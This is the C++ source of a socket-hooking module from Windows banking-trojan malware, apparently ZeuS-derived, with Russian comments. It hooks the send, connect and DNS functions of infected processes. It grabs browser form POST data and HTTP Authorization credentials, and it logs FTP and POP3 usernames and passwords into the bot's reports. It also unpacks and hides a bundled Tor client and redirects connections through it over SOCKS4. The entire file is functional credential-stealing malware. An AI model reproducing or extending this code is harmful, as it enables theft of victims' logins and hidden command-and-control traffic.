#include <windows.h>
#include <shlwapi.h>
#include <wininet.h>
#include <ws2tcpip.h>
#include <shellapi.h>

#include "defines.h"
#include "core.h"
#include "report.h"
#include "sockethook.h"
#include "cryptedstrings.h"
#include "httpgrabber.h"
#include "dynamicconfig.h"
#include "localconfig.h"
#include "..\common\httptools.h"

#include "..\common\mem.h"
#include "..\common\str.h"
#include "..\common\debug.h"
#include "..\common\wsocket.h"
#include "..\common\fs.h"
#include "..\common\process.h"
#include "..\common\sync.h"
#include "..\common\ucl.h"
#include "..\common\tor.h"

#if(BO_SOCKET_FTP > 0 || BO_SOCKET_POP3 > 0)
////////////////////////////////////////////////////////////////////////////////////////////////////
// Переменные и функции для хранения промежуточных данных.
////////////////////////////////////////////////////////////////////////////////////////////////////

#if defined USE_TOR
struct Socks4Header {
	u_char bVn;
	u_char bCd;
	u_short wPort;
	struct in_addr dIP;
};

	static LPSTR SOCKS_USERNAME;
	static DWORD torForCurrentThread;
	static sockaddr_in socks_sin;
	static sockaddr_in6 socks_sin6;
	bool isset_inet4 = false;
	bool isset_inet6 = false;
#endif

typedef struct
{
  SOCKET socket;
  LPWSTR userName;
  LPWSTR pass;
} SOCKETDATA;

static SOCKETDATA *socketData;
static DWORD socketDataCount;
static CRITICAL_SECTION socketDataCs;

static SOCKETDATA *socketDataSearch(SOCKET s)
{
  for(DWORD i = 0; i < socketDataCount; i++)if(socketData[i].socket == s && socketData[i].socket != INVALID_SOCKET)return &socketData[i];
  return NULL;
}

static SOCKETDATA *socketDataCreate(SOCKET s)
{
  SOCKETDATA *sd = NULL;
  for(DWORD i = 0; i < socketDataCount; i++)if(socketData[i].socket == INVALID_SOCKET){sd = &socketData[i]; break;}
  if(sd == NULL && Mem::reallocEx(&socketData, sizeof(SOCKETDATA) * (socketDataCount + 1)))sd = &socketData[socketDataCount++];
  if(sd != NULL)sd->socket = s;
  return sd;
}

static void socketDataFree(SOCKETDATA *sd, bool freeOnly = false)
{
  sd->socket = INVALID_SOCKET;
  
  Mem::free(sd->userName);
  sd->userName = NULL;
  
  Mem::free(sd->pass);
  sd->pass = NULL;

  //Отпимизируем список.
  if(freeOnly == false)
  {
    DWORD newCount = socketDataCount;
    while(newCount > 0 && socketData[newCount - 1].socket == INVALID_SOCKET)newCount--;
    if(newCount != socketDataCount)
    {
      Mem::reallocEx(&socketData, sizeof(SOCKETDATA) * newCount);
      socketDataCount = newCount;
    }
  }
}
#if defined USE_TOR
#define MAX_HOSTS 256
const char        *Hosts[MAX_HOSTS] = {0, };
const char       **Hosts_ptr = &Hosts[0];
const char * const*Hosts_end = &Hosts[MAX_HOSTS];

u_long HostsLookupName(const char *name)
{
	const char **i = Hosts;
	unsigned int namesize;
	unsigned long addr;

	for(; i < Hosts_end; ++i)
	{
		if(*i && !Str::_CompareA(*i, name, -1, -1))
		{
			return i - Hosts;
		}
	}

	namesize = Str::_LengthA(name) + 1;
	
	*Hosts_ptr = (char*)Mem::realloc((void*)*Hosts_ptr, namesize);

	Mem::_copy((void *)*Hosts_ptr, name, namesize);

	addr = (Hosts_ptr++) - Hosts;

	if(Hosts_ptr == Hosts_end)
		Hosts_ptr = Hosts;

	return addr;
}

const char *HostsLookupAddr(u_long addr)
{
	if(addr >= (unsigned)(Hosts_end - Hosts))
		return NULL;

	return Hosts[addr];
}
#endif

////////////////////////////////////////////////////////////////////////////////////////////////////
#define XOR_COMPARE(d, w) ((*((LPDWORD)(d)) ^ BO_CLIENT_VERSION) == ((w) ^ BO_CLIENT_VERSION)) //Просто крипт для слов.
static void browserformgrab(void* buffer1, DWORD amount1)
{

	LPSTR version;
	DWORD versionSize;
	LPSTR uri;
	DWORD uriSize;
	LPSTR host;
	DWORD hostSize;
	LPSTR method;
	DWORD methodSize;
	LPSTR postData;
	DWORD postDataSize;
	LPSTR tmp;
	DWORD tmpSize;
	DWORD bytesToSkip = 0;
	int result=1;
	HttpGrabber::REQUESTDATA requestData;
	char number[11];
	bool sign;

	
	Mem::_zero(&requestData, sizeof(HttpGrabber::REQUESTDATA));

  //Проверяем ключевые данные.
  if((version  = HttpTools::_getMimeHeader(buffer1, amount1, (LPSTR)HttpTools::GMH_REQUEST_HTTP_VERSION, &versionSize))  == NULL || Str::_CompareA(version, "HTTP/1.1", versionSize, 8) != 0 ||
     (uri      = HttpTools::_getMimeHeader(buffer1, amount1, (LPSTR)HttpTools::GMH_HTTP_URI,     &uriSize))      == NULL || uriSize == 0    ||
     (method   = HttpTools::_getMimeHeader(buffer1, amount1, (LPSTR)HttpTools::GMH_HTTP_METHOD,  &methodSize))   == NULL || methodSize == 0 ||
     (host     = HttpTools::_getMimeHeader(buffer1, amount1, "Host",                             &hostSize))     == NULL || hostSize == 0   ||
     (postData = HttpTools::_getMimeHeader(buffer1, amount1, (LPSTR)HttpTools::GMH_DATA,         &postDataSize)) == NULL)
  {
	
    result=-1; //Ошибка протокола.
	goto skip;
  }
  
  //Вычисляем сколько байт нужно пропустить, до начала слежения следующего запроса.

  if((tmp = HttpTools::_getMimeHeader(buffer1, amount1, "Content-Length", &tmpSize)) != NULL)
  {
	 // WDEBUG0(WDDT_INFO, "1-@ ancav1");
	  if(tmpSize == 0 || tmpSize > sizeof("4294967295") - 1){result=-1;goto skip;}

    Str::_CopyA(number, tmp, tmpSize);
    bytesToSkip = Str::_ToInt32A(number, &sign);
    if(sign || bytesToSkip < postDataSize)
    {// WDEBUG0(WDDT_INFO, "2-@ ancav1");
#     if defined WDEBUG0
      WDEBUG0(WDDT_ERROR, "(bytesToSkip < postDataSize) == true.");
#     endif
      result=-1;
	  goto skip;
    }
    bytesToSkip -= postDataSize;
  }
  else if(postDataSize != 0)
  {
    //Длины нет, а POST-данные есть... Ошибка.
	  WDEBUG0(WDDT_INFO, "3-@ ancav1");
    result=-1;  
	goto skip;
  }

#if defined WDEBUG2
  WDEBUG2(WDDT_INFO, "bytesToSkip=%i, postDataSize=%i 1", bytesToSkip, postDataSize);  
#endif

  //Теперь заполняем структуру нормально.
  {
    requestData.flags = HttpGrabber::RDF_NSPR4; 
    
    //URL.
    {
      LPSTR scheme     = "http://";
      DWORD schemeSize = 7;

      //Определяем HTTPS.
	  

      requestData.url = (LPSTR)Mem::alloc(8/*scheme*/ + hostSize + 1/*слеш*/ + uriSize);
	  if(requestData.url == NULL){goto skip;}
      
      //Scheme
      Mem::_copy(requestData.url, scheme, schemeSize);
      requestData.urlSize = schemeSize;
        
      //Хост. Порт является частью хоста.
      Mem::_copy(requestData.url + requestData.urlSize, host, hostSize);
      requestData.urlSize += hostSize;

      //Слеш
      if(*uri != '/')requestData.url[requestData.urlSize++] = '/';

       //URI.
      Mem::_copy(requestData.url + requestData.urlSize, uri, uriSize);
      requestData.urlSize += uriSize;

      requestData.url[requestData.urlSize] = 0;
    }

    //Реферер.
    if((tmp = HttpTools::_getMimeHeader(buffer1, amount1, "Referer", &tmpSize)) != NULL && tmpSize > 0)
    {
      requestData.referer     = Str::_CopyExA(tmp, tmpSize);
      requestData.refererSize = tmpSize;
    }
    
    //Verb.
    if(method[0] == 'P' && methodSize == 4)requestData.verb = HttpGrabber::VERB_POST;
    else if(method[0] == 'G' && methodSize == 3)requestData.verb = HttpGrabber::VERB_GET;
    else goto skip;

    //Content-Type.
    if((tmp = HttpTools::_getMimeHeader(buffer1, amount1, "Content-Type", &tmpSize)) != NULL && tmpSize > 0)
    {
      requestData.contentType     = Str::_CopyExA(tmp, tmpSize);
      requestData.contentTypeSize = tmpSize;
    }
    
    if(postDataSize > 0 && postDataSize <= HttpGrabber::MAX_POSTDATA_SIZE)
    {
      requestData.postData     = (void *)postData;
      requestData.postDataSize = postDataSize;
    }

    //Получаем данные авторизации.
    if((tmp = HttpTools::_getMimeHeader(buffer1, amount1, "Authorization", &tmpSize)) != NULL && tmpSize > 0)
    {
      if(!HttpTools::_parseAuthorization(tmp, tmpSize, &requestData.authorizationData.userName, &requestData.authorizationData.password))
      {
        requestData.authorizationData.unknownType = Str::_CopyExA(tmp, tmpSize);
      }
    }
    
    //Текущая конфигурация.
    requestData.dynamicConfig = DynamicConfig::getCurrent();
    requestData.localConfig   = LocalConfig::getCurrent();


  }
    

skip:
  DWORD newRequestSize;
  //Запрос некорректный, игнарируем соединение.
        if(result == -1)
        {
          
#         if defined WDEBUG0
          //WDEBUG0(WDDT_ERROR, "Protocol error detected. 1");
#         endif     
		  return;
        }
        else 
        {
          //Запрос корректный, но он нам не интересен.
         
          
            DWORD analizeResult = HttpGrabber::analizeRequestData(&requestData);
			if((analizeResult == HttpGrabber::ANALIZEFLAG_SAVED_REPORT) || (analizeResult == HttpGrabber::ANALIZEFLAG_POSTDATA_URLENCODED)){
            newRequestSize = amount1;
			newRequestSize = HttpTools::_modifyMimeHeader(buffer1, newRequestSize, "Accept-Encoding", "identity");//FIXME: добавить, если не сущетвует.
            newRequestSize = HttpTools::_removeMimeHeader(buffer1, newRequestSize, "TE");
            newRequestSize = HttpTools::_removeMimeHeader(buffer1, newRequestSize, "If-Modified-Since"); //Избавляемся чтением из кеша.
			}
			return;
        }
		
}
static bool socketGrabber(SOCKET socket, const LPBYTE data, const DWORD dataSize)
{
  if(socket == INVALID_SOCKET || data == NULL){return false;}
  LPWSTR qq;
  qq=Str::_utf8ToUnicode(data, dataSize);
  if(Str::_findSubStringW(qq,L"text/html;q=0.7, */*;q=1") != NULL)
  {
	  //WDEBUG0(WDDT_INFO,"ZAPROS@ MERNA");
	  goto skip;
  }
  //WDEBUG1(WDDT_INFO, "SOCKETGRAB: %s", qq);
  CWA(kernel32, EnterCriticalSection)(&socketDataCs);
  if((*data == 0x47 && *(data+1) == 0x45 && *(data+2) == 0x54) || ((*data == 0x50) && (*(data+1) == 0x4f) && (*(data+2) == 0x53) && (*(data+3) == 0x54)))
  {/*WDEBUG0(WDDT_INFO,"ANCANQ!");*/browserformgrab((void*)data,dataSize);}
  CWA(kernel32, LeaveCriticalSection)(&socketDataCs);
  //Поиск имени, Поиск пароля
  
  if(dataSize > 6 && (XOR_COMPARE(data, 0x52455355/*USER*/) || XOR_COMPARE(data, 0x53534150/*PASS*/)) && data[4] == ' ')
  {
    LPSTR argOffset = (LPSTR)(data + 5);
    DWORD argSize   = dataSize - 5;
    LPWSTR argument;
	
    //LPSTR nextLine;
    WDEBUG3(WDDT_INFO, "USER/PASS, argOffset=%u, dataSize=%u, argSize=%u", 5, dataSize, argSize);
    
    //Выделаяем аргумент команды.
    {
      DWORD i = 0;
      for(; i < argSize; i++)
      {
        BYTE c = argOffset[i];
        if(c == '\r' || c == '\n')
        {
          //nextLine = &argOffset[i + 1];
          break;
        }
        if(c < 0x20)return false;
      }
      if(i == 0 || i == argSize || (argument = Str::_utf8ToUnicode(argOffset, i)) == NULL)return false;
      WDEBUG1(WDDT_INFO, "argument=%s", argument);
    }

    //Добавляем промежуточные данные.
    SOCKETDATA *sd;
    bool ok = false;

    CWA(kernel32, EnterCriticalSection)(&socketDataCs);
    if((sd = socketDataSearch(socket)) == NULL && (sd = socketDataCreate(socket)) == NULL)Mem::free(argument);
    else
    {
      ok = true;
      if(data[0] == 'U')
      {
        socketDataFree(sd, true); //Обнуляем данные.
        //Mem::free(sd->userName);
        sd->userName = argument;
      }
      else //if(data[0] == 'P')
      {
        Mem::free(sd->pass);
        sd->pass = argument;
      }
      sd->socket = socket;
    }
    CWA(kernel32, LeaveCriticalSection)(&socketDataCs);
    
    //Рекрусия на следующие данные после \r\n.
    /*
    if(ok)
    {
      LPSTR dataEnd = data + dataSize;
      while(nextLine < dataEnd && (*nextLine == '\r' || *nextLine == '\n'))nextLine++;
      if(nextLine < dataEnd)ok = socketGrabber(socket, (LPBYTE)nextLine, (DWORD)(DWORD_PTR)(dataEnd - nextLine));
    }
    */
    return ok;
  }
  
  //Опеределение протокола.
  if(dataSize > 1)
  {
    bool ok = false;

    CWA(kernel32, EnterCriticalSection)(&socketDataCs);
    SOCKETDATA *sd = socketDataSearch(socket);
    if(sd != NULL)
    {
      if(sd->userName == NULL || sd->pass == NULL)socketDataFree(sd);
      else
      {
        BYTE protocolType      = 0;
        WCHAR protocolTypeStr[max(CryptedStrings::len_sockethook_report_prefix_ftp, CryptedStrings::len_sockethook_report_prefix_pop3)];

        //Опеределяем протокол.
        if(0){}
#       if(BO_SOCKET_FTP > 0)
        else if((dataSize >= 3 && (data[0] == 'C' || data[0] == 'P') && data[1] == 'W' && data[2] == 'D') ||
                (dataSize >= 4 && (XOR_COMPARE(data, 0x45505954/*TYPE*/) || XOR_COMPARE(data, 0x54414546/*FEAT*/) || XOR_COMPARE(data, 0x56534150/*PASV*/)))
               )
        {
          protocolType    = BLT_LOGIN_FTP;
          CryptedStrings::_getW(CryptedStrings::id_sockethook_report_prefix_ftp, protocolTypeStr);
        }
#       endif
#       if(BO_SOCKET_POP3 > 0)
        else if(dataSize >= 4 && (XOR_COMPARE(data, 0x54415453/*STAT*/) || XOR_COMPARE(data, 0x5453494C/*LIST*/)))
        {
          protocolType    = BLT_LOGIN_POP3;
          CryptedStrings::_getW(CryptedStrings::id_sockethook_report_prefix_pop3, protocolTypeStr);
        }
#       endif
        WDEBUG1(WDDT_INFO, "protocolType=%u", protocolType);

        if(protocolType != 0)
        {
          SOCKADDR_STORAGE sa;
          int size = sizeof(SOCKADDR_STORAGE);

          if(CWA(ws2_32, getpeername)(socket, (sockaddr *)&sa, &size) == 0 && !WSocket::_isLocalIp(&sa))
          {
            bool write = false;             

            if(0){}
#           if(BO_SOCKET_POP3 > 0)
            else if(protocolType == BLT_LOGIN_POP3)
            {
              write = true;
            }
#           endif
#           if(BO_SOCKET_FTP > 0)
            else if(protocolType == BLT_LOGIN_FTP)
            {
              CSTR_GETW(anonymous, sockethook_user_anonymous);
              if(Str::_CompareW(sd->userName, anonymous, -1, CryptedStrings::len_sockethook_user_anonymous - 1) != 0)write = true;
            }
#           endif

            if(write == true)
            {
              WCHAR ipAddress[MAX_PATH];
              WSocket::ipToStringW(&sa, ipAddress);
              CSTR_GETW(reportFormat, sockethook_report_format);
              Report::writeStringFormat(protocolType, NULL, NULL, reportFormat, protocolTypeStr, sd->userName, sd->pass, ipAddress);
            }
          }
          socketDataFree(sd);
        }
      }
    }
    CWA(kernel32, LeaveCriticalSection)(&socketDataCs);
    
    return ok;
  }
  skip:
  return false;
}

void SocketHook::init(void)
{
  socketData      = NULL;
  socketDataCount = 0;
  CWA(kernel32, InitializeCriticalSection)(&socketDataCs);
#if defined USE_TOR
  torForCurrentThread = TlsAlloc();
  if(torForCurrentThread != TLS_OUT_OF_INDEXES) TlsSetValue(torForCurrentThread, (void*)0);
  int sinsize = sizeof(sockaddr);
  int sinsize6 = sizeof(sockaddr_in6);
  CSTR_GETA(localhost_sock,socket_localhost);
  if(WSAStringToAddressA(localhost_sock, AF_INET, NULL, (struct sockaddr *)&socks_sin, &sinsize) == 0) isset_inet4 = true; if(WSAStringToAddressA("[::1]:9050", AF_INET6, NULL, (struct sockaddr *)&socks_sin6, &sinsize6) == 0) isset_inet6 = true;
  CSTR_GETA(tor_path, core_file_tor);
  SOCKS_USERNAME = Str::_CopyExA(tor_path, 4);
  
  WCHAR strObject[50];
  Core::generateObjectName(Core::OBJECT_ID_TOR_CONTROL, strObject, MalwareTools::KON_SESSION);
  if(Sync::_createUniqueMutex(0, strObject)) Process::_createThread(0, (LPTHREAD_START_ROUTINE)SocketHook::run_tor, 0);

#endif
}

void SocketHook::uninit(void)
{
  for(DWORD i = 0; i < socketDataCount; i++)socketDataFree(&socketData[i], true);
  Mem::free(socketData);
  CWA(kernel32, DeleteCriticalSection)(&socketDataCs);
}

int WSAAPI SocketHook::hookerCloseSocket(SOCKET s)
{
  //WDEBUG0(WDDT_INFO, "Called"); //Бесит в логах.
  
  if(Core::isActive())//Возможна небольшая утечка памяти.
  {
    CWA(kernel32, EnterCriticalSection)(&socketDataCs);
    SOCKETDATA *sd = socketDataSearch(s);
    if(sd)socketDataFree(sd);
    CWA(kernel32, LeaveCriticalSection)(&socketDataCs);
  }

  return CWA(ws2_32, closesocket)(s);
}

int WSAAPI SocketHook::hookerSend(SOCKET s, const char *buf, int len, int flags)
{
  //WDEBUG0(WDDT_INFO, "Called"); //Бесит в логах.
  if(Core::isActive())socketGrabber(s, (LPBYTE)buf, len);
  return CWA(ws2_32, send)(s, buf, len, flags);
}

int WSAAPI SocketHook::hookerWsaSend(SOCKET s, LPWSABUF buffers, DWORD bufferCount, LPDWORD numberOfBytesSent, DWORD flags, LPWSAOVERLAPPED overlapped, LPWSAOVERLAPPED_COMPLETION_ROUTINE completionRoutine)
{
  //WDEBUG0(WDDT_INFO, "Called"); //Бесит в логах.
	if(Core::isActive())for(DWORD i = 0; i < bufferCount; i++) 
	{
		socketGrabber(s, (LPBYTE)buffers->buf, buffers->len);
	}
  return WSASend(s, buffers, bufferCount, numberOfBytesSent, flags, overlapped, completionRoutine);
}
#endif

#if defined USE_TOR

void SocketHook::enableTorMode(bool enable)
{
	CWA(kernel32, TlsSetValue)(torForCurrentThread, (void *)(enable ? 1 : 0));
}

int WSAAPI SocketHook::hookerconnect(IN SOCKET s, IN const struct sockaddr FAR * name, IN int namelen)
#define SIN(name) ((struct sockaddr_in *)(name))
#define SIN6(name) ((struct sockaddr_in6 *)(name))
#define S4H(pkt) ((struct Socks4Header *)(pkt))
{
	//WDEBUG0(WDDT_INFO, "Called!");
	if(torForCurrentThread != TLS_OUT_OF_INDEXES && CWA(kernel32, TlsGetValue)(torForCurrentThread) == (void *)1)
	{
		WDEBUG1(WDDT_INFO, "Connecting: %u", s);
		const char *hostname;
		unsigned int hostname_size;
		void *pkt;
		u_char *p;
		int res;

		if(name->sa_family == AF_INET)
		{
			if(SIN(name)->sin_addr.s_addr == 0x0100007f)
				return connect(s, name, namelen);

			if(!(hostname = HostsLookupAddr(SIN(name)->sin_addr.s_addr)))
				return SOCKET_ERROR;
			
			res = connect(s, (sockaddr *)&socks_sin, sizeof(sockaddr_in));
			
			if(res == SOCKET_ERROR) {WDEBUG1(WDDT_INFO, "Socket ERROR v4: %u, %u", WSAGetLastError()); return res;}

			WDEBUG1(WDDT_INFO, "Connected: %u", s);
		}
		else if(name->sa_family == AF_INET6)
		{

			if(!(hostname = HostsLookupAddr(SIN6(name)->sin6_addr.u.Byte[0])))
				return SOCKET_ERROR;

			//hostname = "4fragui4v74j4bj5.onion";
			
			WSocket::setNonBlockingMode(s, false);
			
			res = connect(s, (sockaddr *)&socks_sin6, sizeof(sockaddr_in6));

			if(res == SOCKET_ERROR) {WDEBUG1(WDDT_INFO, "Socket ERROR v6: %u, %u", WSAGetLastError()); return res;}

			WDEBUG1(WDDT_INFO, "Connected: %u", s);

		}
		hostname_size = Str::_LengthA(hostname) + 1;
		pkt = Mem::alloc(sizeof(struct Socks4Header) + Str::_LengthA(SOCKS_USERNAME) + 1 + hostname_size + 1);
		S4H(pkt)->bVn = 4;
		S4H(pkt)->bCd = 1;
		S4H(pkt)->wPort = SIN(name)->sin_port;
		S4H(pkt)->dIP.s_addr = 0x01000000;

		p = (u_char *)pkt + sizeof(struct Socks4Header);
		Mem::_copy(p, SOCKS_USERNAME, CryptedStrings::len_core_file_tor);	p += CryptedStrings::len_core_file_tor;
		Mem::_copy(p, hostname, hostname_size);					p += hostname_size;

		send(s, (const char *)pkt, p - (u_char *)pkt, 0);

		do {
			recv(s, (char *)pkt, sizeof(struct Socks4Header), 0);
			Sleep(100);
		} while(S4H(pkt)->bCd == 0);
		WDEBUG1(WDDT_INFO, "received: %u", s);
		Mem::free(pkt);
		return 0;
	}
	else
		return connect(s, name, namelen);
}

int WINAPI SocketHook::hookerWSAConnect(
  _In_   SOCKET s,
  _In_   const struct sockaddr *name,
  _In_   int namelen,
  _In_   LPWSABUF lpCallerData,
  _Out_  LPWSABUF lpCalleeData,
  _In_   LPQOS lpSQOS,
  _In_   LPQOS lpGQOS
)
{
	WDEBUG0(WDDT_INFO, "WSAConnect.");
	return hookerconnect(s,name,namelen);
}

int WSAAPI SocketHook::hookergetaddrinfo(const char FAR * nodename, const char FAR * servname, const struct addrinfo FAR * hints, struct addrinfo FAR * FAR * res)
{
	//WDEBUG0(WDDT_INFO, "Called!");
	if(torForCurrentThread != TLS_OUT_OF_INDEXES && CWA(kernel32, TlsGetValue)(torForCurrentThread) == (void *)1)
	{
		WDEBUG1(WDDT_INFO, "GetAddrInfo: %s", nodename);
		int ret = getaddrinfo("localhost", servname, hints, res);
		
		if(ret)
			return ret;
		
		if((*res)->ai_family == AF_INET) ((struct sockaddr_in *)(*res)->ai_addr)->sin_addr.s_addr = HostsLookupName(nodename);
		else if ((*res)->ai_family == AF_INET6) ((struct sockaddr_in6 *)(*res)->ai_addr)->sin6_addr.u.Byte[0] = (UCHAR)HostsLookupName(nodename);
		(*res)->ai_next = NULL;

		return 0;
	}
	else
		return getaddrinfo(nodename, servname, hints, res);
}

int WSAAPI SocketHook::hookerGetAddrInfoW(
  _In_opt_  PCWSTR pNodeName,
  _In_opt_  PCWSTR pServiceName,
  _In_opt_  const ADDRINFOW *pHints,
  _Out_     PADDRINFOW *ppResult
)
{
	if(torForCurrentThread != TLS_OUT_OF_INDEXES && CWA(kernel32, TlsGetValue)(torForCurrentThread) == (void *)1)
	{
		WDEBUG1(WDDT_INFO, "GetAddrInfoW: %s", pNodeName);
		int ret = GetAddrInfoW(L"localhost", pServiceName, pHints, ppResult);
		
		if(ret)
			return ret;

		LPSTR nodename = Str::_unicodeToAnsiEx((LPWSTR)pNodeName,-1);

		if((*ppResult)->ai_family == AF_INET) ((struct sockaddr_in *)(*ppResult)->ai_addr)->sin_addr.s_addr = HostsLookupName(nodename);
		else if ((*ppResult)->ai_family == AF_INET6) ((struct sockaddr_in6 *)(*ppResult)->ai_addr)->sin6_addr.u.Byte[0] = (UCHAR)HostsLookupName(nodename);
		(*ppResult)->ai_next = NULL;
		Mem::free(nodename);

		return 0;
	}
	else
		return GetAddrInfoW(pNodeName, pServiceName, pHints, ppResult);
}

struct hostent FAR *WSAAPI SocketHook::hookergethostbyname(IN const char FAR * name)
{
	//WDEBUG0(WDDT_INFO, "Called!");
	if(torForCurrentThread != TLS_OUT_OF_INDEXES && CWA(kernel32, TlsGetValue)(torForCurrentThread) == (void *)1)
	{
		WDEBUG1(WDDT_INFO, "gethostbyname: %s", name);
		struct hostent *phe = gethostbyname("localhost");

		*(u_long *)phe->h_addr_list[0] = HostsLookupName(name);
				   phe->h_addr_list[1] = NULL;

		return phe;
	}
	else
		return gethostbyname(name);
}

HANDLE WINAPI SocketHook::hookerWSAAsyncGetHostByName(
  _In_   HWND hWnd,
  _In_   unsigned int wMsg,
  _In_   const char *name,
  _Out_  char *buf,
  _In_   int buflen
)
{
	if(buflen<0x120)
	{
		CWA(user32, PostMessage)(hWnd, wMsg,5,WSAENOBUFS*65536+0x120);
		return (HANDLE)5;
	}
	if(name == NULL) WSAAsyncGetHostByName(hWnd, wMsg, name, buf, buflen);
	if(Str::_CompareA(name, "localhost", 9, 9) == 0 && ((*(name + 9) == 0) || (*(name + 9) == ':'))) return WSAAsyncGetHostByName(hWnd, wMsg, name, buf, buflen);
	SOCKADDR_IN isLocal;
	LPWSTR localW = Str::_ansiToUnicodeEx((LPSTR)name, -1);
	WSocket::stringToIpW((SOCKADDR_STORAGE*)&isLocal, localW);
	if(WSocket::_isLocalIp((SOCKADDR_STORAGE*)&isLocal))WSAAsyncGetHostByName(hWnd, wMsg, name, buf, buflen);

	WDEBUG1(WDDT_INFO, "WSAAsyncGetHostByName: %s", name);
	struct hostent *phe = gethostbyname("localhost");

	*(u_long *)phe->h_addr_list[0] = HostsLookupName(name);
				phe->h_addr_list[1] = NULL;
    Mem::_copy(buf, phe, buflen);
	
	return (HANDLE)1;
}

void WINAPI SocketHook::run_tor(void* p)
{
start:
	LPWSTR path = (LPWSTR)Mem::alloc(MAX_PATH*sizeof(WCHAR));
	CSTR_GETW(tor_path, core_file_tor);
	CSTR_GETW(tor_path_fmt, core_path_tor);
	Fs::_pathCombine(path, coreData.paths.home, tor_path);
	if(CWA(kernel32, GetFileAttributesW)(path) == INVALID_FILE_ATTRIBUTES) Fs::_createDirectoryTree(path, NULL);
	Str::_sprintfExW(&path, tor_path_fmt, path, tor_path, FILEEXTENSION_EXECUTABLE);
	WDEBUG1(WDDT_INFO, "Tor.exe's path: %s", path);
	if(CWA(kernel32, GetFileAttributesW)(path) == INVALID_FILE_ATTRIBUTES)
	{
		void* p = Mem::alloc(tor_bin_real_size);
		DWORD size = tor_bin_real_size;
		if(p && UCL::_DecompressNRV2B((LPBYTE)ucled_tor_bin, ucled_tor_bin_size, (LPBYTE)p, &size)) Fs::_saveToFile(path, p, size);
	}
	STARTUPINFOW si;
	Mem::_zero(&si, sizeof(STARTUPINFOW));
	si.cb = sizeof(STARTUPINFOW);
	si.wShowWindow = SW_HIDE; si.dwFlags = STARTF_USESHOWWINDOW;
	PROCESS_INFORMATION pi;
	LPWSTR commandLine;
	if(isset_inet4) commandLine=Str::_CopyExW(L"SOCKSPort [127.0.0.1]:9050", -1);
	if(isset_inet6) Str::_CatExW(&commandLine, L" SOCKSPort [::1]:9050", -1);
	if(Process::_createEx(path, commandLine, 0, &si, &pi)) WaitForSingleObject(pi.hProcess, INFINITE);
	Mem::free(commandLine);
	goto start;
}

#endif